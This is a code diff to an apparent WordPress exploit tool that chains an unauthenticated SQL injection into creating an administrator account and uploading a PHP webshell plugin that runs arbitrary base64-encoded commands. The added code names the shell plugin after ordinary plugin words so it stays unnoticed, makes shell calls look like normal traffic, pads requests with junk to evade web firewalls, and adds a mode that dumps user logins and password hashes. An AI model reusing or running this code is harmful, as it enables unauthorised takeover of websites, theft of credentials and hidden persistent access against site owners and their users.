+    WEBSHELL_PHP = (
+        "<?php\n"
+        "/* Plugin Name: %s */\n"
+        "add_action('rest_api_init', function () {\n"
+        "    register_rest_route('%s', '/%s', array(\n"
+        "        'methods' => 'POST', 'permission_callback' => '__return_true',\n"
+        "        'callback' => function ($r) {\n"
+        "            if ($r->get_param('rm')) {\n"
+        "                require_once ABSPATH.'wp-admin/includes/plugin.php';\n"
+        "                deactivate_plugins(plugin_basename(__FILE__), true);\n"
+        "                @unlink(__FILE__);\n"
+        "                return new WP_REST_Response(array(\n"
+        "                    'marker' => '%s', 'output' => '[webshell removed]'));\n"
+        "            }\n"
+        "            ob_start(); passthru(base64_decode($r->get_param('c')).' 2>&1');\n"
+        "            return new WP_REST_Response(array(\n"
+        "                'marker' => '%s', 'output' => ob_get_clean()));\n"
+        "        },\n"
+        "    ));\n"
+        "});\n")
+
+    # Plausible plugin-name words so the deployed folder/slug blends with real plugins
+    # (e.g. wp-seo-a1b2) instead of a give-away "wp2shell-..." string.
+    _PLUGIN_WORDS = ("cache", "seo", "optimizer", "backup", "security", "mailer",
+                     "forms", "analytics", "media", "importer", "gallery", "sitemap")
+
+    def _rand_slug(self):
+        return "wp-%s-%s" % (secrets.choice(self._PLUGIN_WORDS), secrets.token_hex(4))
+
+    def _rand_namespace(self):
+        return "%s%s/v1" % (secrets.choice(self._PLUGIN_WORDS), secrets.token_hex(2))
+
+    def _new_session(self):
+        """A fresh cookie-backed opener (own TLS-ignore + proxy config)."""
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        sh = [urllib.request.HTTPSHandler(context=ctx),
+              urllib.request.HTTPCookieProcessor(CookieJar()), _KeepPost()]
+        if self._proxy:
+            sh.append(urllib.request.ProxyHandler(
+                {"http": self._proxy, "https": self._proxy}))
+        else:
+            sh.append(urllib.request.ProxyHandler({}))
+        session = urllib.request.build_opener(*sh)
+        session.addheaders = [(n, v) for n, v in session.addheaders
+                              if n.lower() != "user-agent"]
+        session.addheaders += self.extra_headers
+        return session
+
+    def _login(self, session, username, password):
+        """Log <session> in; True if the admin area is reached (creds still valid)."""
+        try:
+            session.open(urllib.request.Request(
+                self.base + "/wp-login.php",
+                headers={}), timeout=15).read()
+            session.open(urllib.request.Request(
+                self.base + "/wp-login.php",
+                data=urllib.parse.urlencode({
+                    "log": username, "pwd": password, "wp-submit": "Log In",
+                    "redirect_to": self.base + "/wp-admin/",
+                    "testcookie": "1"}).encode(),
+                headers={},
+                method="POST"), timeout=30).read()
+            with session.open(urllib.request.Request(
+                    self.base + "/wp-admin/users.php",
+                    headers={}), timeout=30) as resp:
+                page = resp.read().decode(errors="replace")
+        except urllib.error.URLError:
+            return False
+        return username in page
+
+    def _deploy_shell(self, session):
+        """Upload + activate a persistent webshell plugin.
+        Returns (namespace, route, marker, slug) -- all randomized per deploy."""
+        slug = self._rand_slug()
+        namespace = self._rand_namespace()
+        route = secrets.token_hex(12)
+        marker = secrets.token_hex(12)
+        php = (self.WEBSHELL_PHP % (slug, namespace, route, marker, marker)).encode()
+
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
+            z.writestr("%s/%s.php" % (slug, slug), php)
+
+        with session.open(urllib.request.Request(
+                self.base + "/wp-admin/plugin-install.php?tab=upload",
+                headers={}), timeout=30) as resp:
+            page = resp.read().decode(errors="replace")
+        nonce = re.search(r'name="_wpnonce" value="([^"]+)"', page)
+        if not nonce:
+            raise RuntimeError("plugin-upload nonce not found")
+
+        boundary = "----WebKitFormBoundary%s" % secrets.token_hex(12)
+        body = b"".join((
+            ("--%s\r\nContent-Disposition: form-data; "
+             "name=\"_wpnonce\"\r\n\r\n%s\r\n" % (boundary, nonce.group(1))).encode(),
+            ("--%s\r\nContent-Disposition: form-data; "
+             "name=\"_wp_http_referer\"\r\n\r\n"
+             "/wp-admin/plugin-install.php?tab=upload\r\n" % boundary).encode(),
+            ("--%s\r\nContent-Disposition: form-data; "
+             "name=\"pluginzip\"; filename=\"%s.zip\"\r\n"
+             "Content-Type: application/zip\r\n\r\n" % (boundary, slug)).encode(),
+            buf.getvalue(),
+            ("\r\n--%s--\r\n" % boundary).encode(),
+        ))
+        with session.open(urllib.request.Request(
+                self.base + "/wp-admin/update.php?action=upload-plugin",
+                data=body,
+                headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary},
+                method="POST"), timeout=60) as resp:
+            install_page = resp.read().decode(errors="replace")
+
+        activate = re.search(
+            r'href="([^"]*plugins\.php\?action=activate[^"]*)"', install_page)
+        if not activate:
+            raise RuntimeError("plugin install/activation link not found")
+        session.open(urllib.request.Request(
+            urllib.parse.urljoin(self.base + "/wp-admin/",
+                                html_mod.unescape(activate.group(1))),
+            headers={}), timeout=30).read()
+        return namespace, route, marker, slug
+
+    def _run_webshell(self, namespace, route, marker, command, rm=False, multipart=None):
+        """Invoke the deployed webshell; return its output. In multipart mode the request
+        is shaped exactly like the injection batch -- POST / with `rest_route` carried as a
+        form field (WP reads it from $_POST in WP::parse_request), NOT as a ?rest_route= GET
+        query -- so the shell call is indistinguishable from the rest of the traffic. JSON
+        mode keeps rest_route in the URL (a JSON body can't populate the query var).
+        rm=True tells the shell to self-delete."""
+        mp = self.multipart if multipart is None else multipart
+        rest_route = "/%s/%s" % (namespace, route)
+        cmd_b64 = base64.b64encode((command or "").encode()).decode()
+        if mp:
+            fields = [("rest_route", rest_route), ("c", cmd_b64)]
+            if rm:
+                fields.append(("rm", "1"))
+            ctype, body = self._multipart_encode(fields)
+            url = self.base + "/"                       # rest_route rides in the body
+        else:
+            payload = {"c": cmd_b64}
+            if rm:
+                payload["rm"] = "1"
+            ctype, body = "application/json", json.dumps(payload).encode()
+            url = self.base + "/?rest_route=" + urllib.parse.quote(rest_route)
+        # When bypass is active, use http.client for precise header control
+        if self.cookies or self.bypass:
+            st, _, resp_body, _ = self._lowlevel(
+                url, data=body, headers={"Content-Type": ctype}, method="POST",
+                timeout=60)
+            result = json.loads(resp_body)
+        else:
+            req = urllib.request.Request(
+                url, data=body,
+                headers={"Content-Type": ctype}, method="POST")
+            with self.opener.open(req, timeout=60) as resp:
+                result = json.loads(resp.read())
+        if result.get("marker") != marker:
+            raise RuntimeError("webshell did not respond correctly")
+        return result["output"]
+
+    def exploit(self, command, fresh=False, cleanup=False):
+        """Pre-auth RCE. Reuses a cached admin + deployed webshell for this target when
+        one is present and still valid; otherwise runs the full chain and caches the
+        result. Returns (username, password, command_output). cleanup=True tears the
+        deployed webshell down and forgets the cached state; fresh=True starts over with a
+        brand-new administrator and plugin (first removing any previously deployed shell)."""
         self._normalize_base()
+        old = self._load_state()
+
+        # -- fresh: tear down the previously deployed shell so we don't stack plugins,
+        #    then run the whole chain from scratch (new admin + new plugin) ----------
+        if fresh and not cleanup:
+            if old.get("route") and old.get("marker"):
+                try:
+                    self._run_webshell(old.get("namespace") or "wp2shell/v1",
+                                       old["route"], old["marker"], "true", rm=True)
+                    sys.stderr.write("[*] --fresh: removed previously deployed webshell\n")
+                except Exception as e:
+                    sys.stderr.write("[!] --fresh: old webshell not removed (%s)\n" % e)
+            self._clear_state()
+
+        st = {} if fresh else old
+        ns = st.get("namespace") or "wp2shell/v1"   # default for pre-randomization caches
+        # Call the shell the way it was deployed, so reuse stays multipart even if the
+        # --multipart flag isn't repeated on this run (None -> live self.multipart).
+        st_mp = (st.get("delivery") == "multipart") if st.get("delivery") else None
+
+        # -- teardown: have the cached shell remove itself, then forget it ------
+        if cleanup:
+            if st.get("route") and st.get("marker"):
+                try:
+                    out = self._run_webshell(ns, st["route"], st["marker"],
+                                             command or "true", rm=True, multipart=st_mp)
+                finally:
+                    self._clear_state()
+                return st.get("username"), st.get("password"), out
+            self._clear_state()
+            raise RuntimeError("no cached webshell to clean up for %s" % self.base)
+
+        # 1. reuse an already-deployed webshell -- one request, no login/upload -
+        if st.get("route") and st.get("marker"):
+            try:
+                out = self._run_webshell(ns, st["route"], st["marker"], command,
+                                         multipart=st_mp)
+                sys.stderr.write("[+] reusing deployed webshell for %s\n" % self.base)
+                return st.get("username"), st.get("password"), out
+            except (urllib.error.URLError, RuntimeError, ValueError) as e:
+                sys.stderr.write("[!] cached webshell unusable (%s); redeploying\n" % e)
+
+        # 2. reuse cached admin creds if the user still exists; else create one -
+        username, password = st.get("username"), st.get("password")
+        session = self._new_session()
+        if username and password and self._login(session, username, password):
+            sys.stderr.write("[+] reusing cached administrator %s\n" % username)
+        else:
+            username, password = self._create_admin()
+            session = self._new_session()
+            if not self._login(session, username, password):
+                raise RuntimeError("admin login failed (user not created?)")
+            sys.stderr.write("[+] administrator created: %s:%s\n" % (username, password))
+
+        # 3. deploy a persistent webshell, run the command, cache for next time -
+        sys.stderr.write("[*] deploying webshell, executing command ...\n")
+        namespace, route, marker, slug = self._deploy_shell(session)
+        out = self._run_webshell(namespace, route, marker, command)
+        self._save_state({"username": username, "password": password,
+                          "namespace": namespace, "route": route, "marker": marker,
+                          "slug": slug, "delivery": self._delivery_name()})
+        return username, password, out
+
+    def _create_admin(self):
+        """Chain steps 0-4: preflight, seed oEmbed caches, extract schema, forge the
+        changeset re-entry, and create an administrator. Returns (username, password)."""
+        self._normalize_base()
+        # The blind-SQLi reads below need the timing-oracle baseline. detect() sets it;
+        # when reached via the reuse fast-path (which skips detection) it's still 0.
+        # UNION mode reflects data directly, so it needs no baseline.
+        if self._base <= 0 and not self.union:
+            self.detect()
 
         # 0. row-forgery preflight — confirm the UNION echo works on THIS target BEFORE any
-        #    write. The per_page=-1 split_the_query bypass is what makes forged rows come back;
-        #    a persistent object cache (Redis/Memcached, common on managed hosts) forces
-        #    split_the_query regardless and silently breaks row forgery. Verifying up front
-        #    means we never leave orphan oembed_cache rows on a target the RCE can't finish,
-        #    and we can name the precise blocker. The unauth SQLi itself is already confirmed.
+        #    write. A persistent object cache (Redis/Memcached) forces split_the_query and
+        #    silently breaks row forgery. Verifying up front means we never leave orphan
+        #    oembed_cache rows on a target the RCE can't finish.
         sentinel = secrets.token_hex(8)
         try:
             echo = self._inband_read(["0x%s" % sentinel.encode().hex()])
@@ -671,7 +1353,7 @@ class Target:
             with self.opener.open(
                 urllib.request.Request(
                     self.base + "/?rest_route=/wp/v2/posts&per_page=1&_fields=link",
-                    headers={"User-Agent": self.UA}), timeout=15) as resp:
+                    headers={}), timeout=15) as resp:
                 items = json.loads(resp.read())
         except Exception:
             items = []
@@ -727,13 +1409,13 @@ class Target:
             for u in embed_urls]
         cache_ids = []
         try:
-            vals = self._inband_read(cache_queries)      # all three in a single request
+            vals = self._inband_read(cache_queries)
         except Exception:
             vals = [None] * len(cache_queries)
         for q, v in zip(cache_queries, vals):
             pid = int(re.match(r"\d+", v.strip()).group(0)) if v and re.match(r"\d+", v.strip()) else 0
             if pid < 1:
-                pid = self.read_int(q)                   # blind fallback for this one
+                pid = self.read_int(q)
             if pid < 1:
                 raise RuntimeError("oEmbed cache seeding failed")
             cache_ids.append(pid)
@@ -787,119 +1469,7 @@ class Target:
             {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
             {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
         ])
-
-        # 5. login and deploy self-cleaning webshell plugin
-        sys.stderr.write("[+] administrator created: %s:%s  (%s)\n"
-                         % (username, password, email))
-        sys.stderr.write("[*] logging in, deploying webshell, executing command ...\n")
-
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        sh = [urllib.request.HTTPSHandler(context=ctx),
-              urllib.request.HTTPCookieProcessor(CookieJar()), _KeepPost()]
-        if self._proxy:
-            sh.append(urllib.request.ProxyHandler(
-                {"http": self._proxy, "https": self._proxy}))
-        else:
-            sh.append(urllib.request.ProxyHandler({}))
-        session = urllib.request.build_opener(*sh)
-
-        session.open(urllib.request.Request(
-            self.base + "/wp-login.php",
-            headers={"User-Agent": self.UA}), timeout=15).read()
-        session.open(urllib.request.Request(
-            self.base + "/wp-login.php",
-            data=urllib.parse.urlencode({
-                "log": username, "pwd": password, "wp-submit": "Log In",
-                "redirect_to": self.base + "/wp-admin/",
-                "testcookie": "1"}).encode(),
-            headers={"User-Agent": self.UA},
-            method="POST"), timeout=30).read()
-
-        with session.open(urllib.request.Request(
-                self.base + "/wp-admin/users.php",
-                headers={"User-Agent": self.UA}), timeout=30) as resp:
-            users_page = resp.read().decode(errors="replace")
-        if username not in users_page:
-            raise RuntimeError("admin login failed (user not created?)")
-
-        slug = "wp2shell-%s" % secrets.token_hex(6)
-        route = secrets.token_hex(12)
-        marker = secrets.token_hex(12)
-        php = (
-            "<?php\n"
-            "/* Plugin Name: %s */\n"
-            "add_action('rest_api_init', function () {\n"
-            "    register_rest_route('wp2shell/v1', '/%s', array(\n"
-            "        'methods' => 'POST', 'permission_callback' => '__return_true',\n"
-            "        'callback' => function ($r) {\n"
-            "            ob_start(); passthru(base64_decode($r->get_param('c')).' 2>&1');\n"
-            "            $o = ob_get_clean();\n"
-            "            require_once ABSPATH.'wp-admin/includes/plugin.php';\n"
-            "            deactivate_plugins(plugin_basename(__FILE__), true);\n"
-            "            @unlink(__FILE__);\n"
-            "            return new WP_REST_Response(array(\n"
-            "                'marker' => '%s', 'output' => $o));\n"
-            "        },\n"
-            "    ));\n"
-            "});\n" % (slug, route, marker)).encode()
-
-        buf = io.BytesIO()
-        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
-            z.writestr("%s/%s.php" % (slug, slug), php)
-
-        with session.open(urllib.request.Request(
-                self.base + "/wp-admin/plugin-install.php?tab=upload",
-                headers={"User-Agent": self.UA}), timeout=30) as resp:
-            page = resp.read().decode(errors="replace")
-        nonce = re.search(r'name="_wpnonce" value="([^"]+)"', page)
-        if not nonce:
-            raise RuntimeError("plugin-upload nonce not found")
-
-        boundary = "----wp2shell%s" % secrets.token_hex(12)
-        body = b"".join((
-            ("--%s\r\nContent-Disposition: form-data; "
-             "name=\"_wpnonce\"\r\n\r\n%s\r\n" % (boundary, nonce.group(1))).encode(),
-            ("--%s\r\nContent-Disposition: form-data; "
-             "name=\"_wp_http_referer\"\r\n\r\n"
-             "/wp-admin/plugin-install.php?tab=upload\r\n" % boundary).encode(),
-            ("--%s\r\nContent-Disposition: form-data; "
-             "name=\"pluginzip\"; filename=\"%s.zip\"\r\n"
-             "Content-Type: application/zip\r\n\r\n" % (boundary, slug)).encode(),
-            buf.getvalue(),
-            ("\r\n--%s--\r\n" % boundary).encode(),
-        ))
-        with session.open(urllib.request.Request(
-                self.base + "/wp-admin/update.php?action=upload-plugin",
-                data=body,
-                headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary,
-                         "User-Agent": self.UA},
-                method="POST"), timeout=60) as resp:
-            install_page = resp.read().decode(errors="replace")
-
-        activate = re.search(
-            r'href="([^"]*plugins\.php\?action=activate[^"]*)"', install_page)
-        if not activate:
-            raise RuntimeError("plugin install/activation link not found")
-        session.open(urllib.request.Request(
-            urllib.parse.urljoin(self.base + "/wp-admin/",
-                                html_mod.unescape(activate.group(1))),
-            headers={"User-Agent": self.UA}), timeout=30).read()
-
-        cmd_req = urllib.request.Request(
-            self.base + "/?rest_route=/wp2shell/v1/%s" % route,
-            data=json.dumps({
-                "c": base64.b64encode(command.encode()).decode()}).encode(),
-            headers={"Content-Type": "application/json",
-                     "User-Agent": self.UA},
-            method="POST")
-        with self.opener.open(cmd_req, timeout=60) as resp:
-            result = json.loads(resp.read())
-        if result.get("marker") != marker:
-            raise RuntimeError("webshell did not respond correctly")
-
-        return username, password, result["output"]
+        return username, password
 
 
 # -- version fingerprint (best-effort, read-only) --------------------------
@@ -961,9 +1531,11 @@ def is_local(base):
 
 def scan_one(url, args):
     t = Target(url, timeout=args.timeout, proxy=args.proxy, sleep=args.sleep,
-               route=args.route, delivery=args.delivery, slot=args.slot)
+               route=args.route, delivery=args.delivery, slot=args.slot,
+               headers=getattr(args, "parsed_headers", []),
+               cookies=args.cookies, bypass=args.bypass)
     rec = {"target": url}
-    # automatic oracle + delivery selection with fallback (see Target.detect_auto)
+    # automatic method (union -> boolean -> time) + delivery selection (see detect_auto)
     try:
         res = t.detect_auto(method=args.method, rounds=args.rounds)
     except urllib.error.URLError as e:
@@ -992,10 +1564,6 @@ def scan_one(url, args):
     rec["active_check"] = "fired" if active else "negative"
     if active:
         rec["status"] = "vulnerable"                     # actively confirmed via the injection
-        # Be precise about WHAT is proven: the active oracle confirms the unauthenticated SQL
-        # injection. The pre-auth RCE is reachable from it on a stock install but additionally
-        # needs no persistent object cache (which forces split_the_query and blocks the row
-        # forgery) -- a precondition we cannot verify remotely without writing to the target.
         rec["confirmed"] = "unauthenticated SQL injection"
         rec["rce"] = ("reachable on stock config; additionally requires no persistent object "
                       "cache (not verified remotely -- the RCE PoC preflights it before writing)")
@@ -1013,20 +1581,13 @@ def scan_one(url, args):
         rec["status"] = "not_vulnerable"
     code = 0 if rec["status"] in ("vulnerable", "affected_version") else 1
     if active and args.proof:
-        # Fast path first: in-band UNION read pulls BOTH scalars in a single request (the
-        # per_page>=500 split_the_query bypass echoes the forged rows back), ~250x fewer
-        # requests than the blind ladder. The time-based blind oracle is the per-scalar
-        # fallback -- used only for whichever scalar doesn't echo (e.g. a persistent object
-        # cache forces split_the_query and blocks the echo). Read-only on either path.
         proof_exprs = {"@@version": ("SELECT @@version", 40),
                        "current_user()": ("SELECT CURRENT_USER()", 48)}
         try:
             vals = t._inband_read([expr for expr, _ in proof_exprs.values()])
         except Exception:
             vals = [None] * len(proof_exprs)
-        # Only warm up a latency baseline if we actually have to fall back to the blind oracle
-        # (the boolean detector may have confirmed without ever running the timing probe).
-        if any(v is None for v in vals) and t._base <= 0:
+        if any(v is None for v in vals) and t._base <= 0 and not t.union:
             try:
                 t.detect(rounds=args.rounds)
             except urllib.error.URLError:
@@ -1050,6 +1611,8 @@ def human(rec):
         line += "  -- %s" % rec.get("error")
     else:
         bits = []
+        if rec.get("method") == "union":
+            bits.append("method=union (data reflected)")
         if rec.get("method") == "boolean":
             bits.append("method=boolean rows(true/false)=%s/%s via %s" % (
                 rec.get("bool_true_rows"), rec.get("bool_false_rows"), rec.get("bool_signal")))
@@ -1084,11 +1647,18 @@ def main():
     p.add_argument("-f", "--file", help="file with one target URL per line (# comments ok)")
     p.add_argument("--proof", action="store_true",
                    help="read @@version + current_user() as evidence (read-only)")
+    p.add_argument("--sql", metavar="QUERY",
+                   help="execute a SQL query via the UNION sink and print the result "
+                        "(read-only, single request). The query must return a single "
+                        "scalar — use GROUP_CONCAT / LIMIT 1 for multi-row. "
+                        "e.g. --sql \"SELECT GROUP_CONCAT(CONCAT(user_login,0x3a,user_pass) "
+                        "SEPARATOR 0x0a) FROM wp_users\"")
     p.add_argument("--route", choices=("auto", "rest-route", "wp-json"), default="auto")
-    p.add_argument("--method", choices=("auto", "boolean", "time"), default="auto",
-                   help="detection oracle. auto (default) tries the fast boolean row-count "
+    p.add_argument("--method", choices=("auto", "boolean", "time", "union"), default="auto",
+                   help="extraction/oracle method. auto (default) tries the fast boolean row-count "
                         "differential first and falls back to the time-based SLEEP oracle; "
-                        "boolean/time force one.")
+                        "boolean/time force a blind oracle; union reflects data directly via a "
+                        "UNION SELECT (one request per value -- far faster, needs the response body).")
     p.add_argument("--delivery", choices=("auto", "json", "multipart"), default="auto",
                    help="batch delivery. auto (default) uses a JSON POST to the batch route and "
                         "falls back to a rest_route=/batch/v1 multipart form on POST / if the JSON "
@@ -1100,52 +1670,164 @@ def main():
                         "proven users endpoint first and falls back to the universal posts-item "
                         "endpoint (/wp/v2/posts/<id>) when users is disabled for unauthenticated "
                         "callers; users/posts-item force one.")
+    p.add_argument("--fresh", action="store_true",
+                   help="start over: remove any previously deployed shell, then run the full "
+                        "chain with a brand-new administrator and a brand-new plugin")
+    p.add_argument("--cleanup", action="store_true",
+                   help="tell the cached webshell to delete itself and forget the saved state")
     p.add_argument("--sleep", type=float, default=4.0, help="injected SLEEP seconds (default 4)")
     p.add_argument("--rounds", type=int, default=3, help="median over N probes (default 3)")
     p.add_argument("--timeout", type=float, default=15.0)
     p.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080 (Burp)")
+    p.add_argument("--cookies", default="",
+                   help="cookies string sent on every request via http.client "
+                        "(e.g. 'cf_clearance=...; __cf_bm=...; pll_language=en'). "
+                        "When set (or with --bypass), requests use http.client "
+                        "with junk-padded bodies (request pumping technique).")
+    p.add_argument("--bypass", action="store_true",
+                   help="Enable request pumping: route all requests "
+                        "through http.client and wrap the batch in a ~2MB junk-padded "
+                        "JSON body (1MB frontpad + random junk keys + nested junk + "
+                        "trailing junk) so the WAF never inspects the real requests "
+                        "array. No headers are sent automatically — supply UA and "
+                        "any fingerprint headers via -H. Combine with --multipart for "
+                        "junk-padded multipart bodies, or --cookies for CF clearance.")
+    p.add_argument("-H", "--header", action="append", default=[], metavar="'Name: Value'",
+                   help="extra header added to every request (repeatable), e.g. "
+                        "-H 'Cookie: a=b' -H 'X-Forwarded-For: 127.0.0.1'")
     p.add_argument("-t", "--threads", type=int, default=10,
                    help="concurrent workers for -f scans (default 10)")
     p.add_argument("--authorized", action="store_true",
                    help="assert authorization for remote targets")
     p.add_argument("--json", action="store_true", help="emit JSON")
     args = p.parse_args()
+    if args.fresh and args.cleanup:
+        p.error("--fresh and --cleanup are mutually exclusive")
     if args.multipart:
         args.delivery = "multipart"
+    # parse -H "Name: Value" pairs once; reused for every Target
+    hdrs = []
+    for h in args.header:
+        if ":" not in h:
+            p.error("bad header %r (expected 'Name: Value')" % h)
+        name, value = h.split(":", 1)
+        hdrs.append((name.strip(), value.strip()))
+    args.parsed_headers = hdrs   # consumed by scan_one() for -f targets
 
-    # -- RCE mode (-c COMMAND) ------------------------------------------------
-    if args.command:
+    # -- RCE mode (-c COMMAND / --cleanup) ------------------------------------
+    if args.command or args.cleanup:
         if not args.url:
-            p.error("-c requires a target URL")
+            p.error("-c/--cleanup require a target URL")
         url = args.url if "://" in args.url else "http://" + args.url
         if not is_local(url) and not args.authorized:
-            p.error("-c on remote targets requires --authorized")
-        # The RCE forge is JSON end-to-end, but gate with the full auto oracle so a target that
-        # needs the posts-item slot (users endpoint hardened) still exploits. The exploit's own
-        # row forge rides the widgets slot regardless of the detection slot.
+            p.error("-c/--cleanup on remote targets requires --authorized")
+        # Honor the selected delivery for the RCE forge/extraction too, so with
+        # --multipart the batch requests ride as rest_route forms (not JSON). auto has
+        # no resolver on this path, so it defaults to JSON.
+        delivery = "json" if args.delivery == "auto" else args.delivery
         t = Target(url, timeout=max(args.timeout, 30), proxy=args.proxy,
-                   sleep=args.sleep, route=args.route, delivery="json", slot=args.slot)
-        try:
-            res = t.detect_auto(method=args.method, rounds=args.rounds)
-        except urllib.error.URLError as e:
-            print("[-] %s" % e.reason); return 2
-        if not res["vulnerable"]:
-            print("[-] not vulnerable"); return 1
-        print("[+] vulnerable (unauth SQLi confirmed: method=%s slot=%s delivery=%s)"
-              % (res["method"], res.get("slot"), res.get("delivery")))
-        # exploit() reads in-band; its blind fallback (used only if an in-band read ever misses)
-        # needs a timing baseline, so establish one if boolean confirmed without running the timer.
-        if t._base <= 0:
+                   sleep=args.sleep, route=args.route, delivery=delivery, slot=args.slot,
+                   headers=hdrs, cookies=args.cookies, bypass=args.bypass)
+
+        if args.cleanup:
             try:
-                t.detect(rounds=1)
-            except urllib.error.URLError:
-                pass
+                _, _, output = t.exploit(args.command, cleanup=True)
+            except (RuntimeError, urllib.error.URLError) as e:
+                print("[-] cleanup failed: %s" % e); return 2
+            print("[+] %s" % output); return 0
+
+        # Reuse fast-path: a cached webshell for this target means we can skip the
+        # detection round-trip entirely and go straight to a single reuse request.
+        # Normalize first so the state key matches the one exploit() saves under
+        # (post http->https / apex->www redirect).
+        t._normalize_base()
+        cached = (not args.fresh) and bool(t._load_state().get("route"))
+        if not cached:
+            # auto/union: prefer UNION reflection (real data, one request); fall back to
+            # the blind timing oracle when reflection is blocked (unless union is forced).
+            if args.method in ("auto", "union") and t._union_confirms():
+                print("[+] vulnerable (UNION reflection confirmed)")
+            elif args.method == "union":
+                print("[-] union reflection failed (not vulnerable or blocked)"); return 1
+            else:
+                try:
+                    det = t.detect(rounds=args.rounds)
+                except urllib.error.URLError as e:
+                    print("[-] %s" % e.reason); return 2
+                if not det["vulnerable"]:
+                    print("[-] not vulnerable"); return 1
+                print("[+] vulnerable (blind SQLi: %.3fs / %.3fs)" % (det["fast"], det["slow"]))
         try:
-            user, pw, output = t.exploit(args.command)
+            user, pw, output = t.exploit(args.command, fresh=args.fresh)
         except (RuntimeError, urllib.error.URLError) as e:
             print("[-] exploit failed: %s" % e); return 2
         print("[+] RCE output:\n")
         print(output, end="")
+        return 0
+
+    # -- standalone UNION proof mode (--method union, single target, no -c) ----
+    if args.method == "union" and not args.file:
+        if not args.url:
+            p.error("--method union requires a target URL")
+        url = args.url if "://" in args.url else "http://" + args.url
+        if not is_local(url) and not args.authorized:
+            p.error("--method union on remote targets requires --authorized")
+        delivery = "json" if args.delivery == "auto" else args.delivery
+        t = Target(url, timeout=args.timeout, proxy=args.proxy,
+                   route=args.route, delivery=delivery, slot=args.slot,
+                   headers=hdrs, cookies=args.cookies, bypass=args.bypass)
+        t.union = True
+        reads = {"@@version": "SELECT @@version",
+                 "current_user()": "SELECT CURRENT_USER()",
+                 "database()": "SELECT DATABASE()",
+                 "user:pass": "SELECT CONCAT_WS(0x3a,user_login,user_pass) "
+                              "FROM wp_users ORDER BY ID LIMIT 1"}
+        try:
+            confirmed = t._union_confirms()
+        except urllib.error.URLError as e:
+            print("[-] %s" % e.reason); return 2
+        if not confirmed:
+            print("[-] union reflection failed (not vulnerable or blocked)")
+            return 1
+        print("[+] vulnerable (UNION reflection confirmed)")
+        out = {}
+        for label, expr in reads.items():
+            try:
+                out[label] = t.read_union(expr)
+            except Exception as e:
+                out[label] = "<error: %s>" % e
+        if args.json:
+            print(json.dumps({"target": url, "union_proof": out}, indent=2))
+        else:
+            for k, v in out.items():
+                print("    %-16s = %s" % (k, v))
+        return 0
+
+    # -- --sql mode: arbitrary UNION read ------------------------------------
+    if args.sql:
+        if not args.url:
+            p.error("--sql requires a target URL")
+        url = args.url if "://" in args.url else "http://" + args.url
+        if not is_local(url) and not args.authorized:
+            p.error("--sql on remote targets requires --authorized")
+        delivery = "json" if args.delivery == "auto" else args.delivery
+        t = Target(url, timeout=max(args.timeout, 30), proxy=args.proxy,
+                   sleep=args.sleep, route=args.route, delivery=delivery, slot=args.slot,
+                   headers=hdrs, cookies=args.cookies, bypass=args.bypass)
+        t.union = True
+        try:
+            confirmed = t._union_confirms()
+        except urllib.error.URLError as e:
+            print("[-] %s" % e.reason); return 2
+        if not confirmed:
+            print("[-] union reflection failed (not vulnerable or blocked)")
+            return 1
+        print("[+] vulnerable (UNION reflection confirmed), executing query ...")
+        try:
+            result = t.read_union(args.sql)
+        except Exception as e:
+            print("[-] query failed: %s" % e); return 2
+        print(result)
         return 0
 
     # -- detection mode (default) ---------------------------------------------
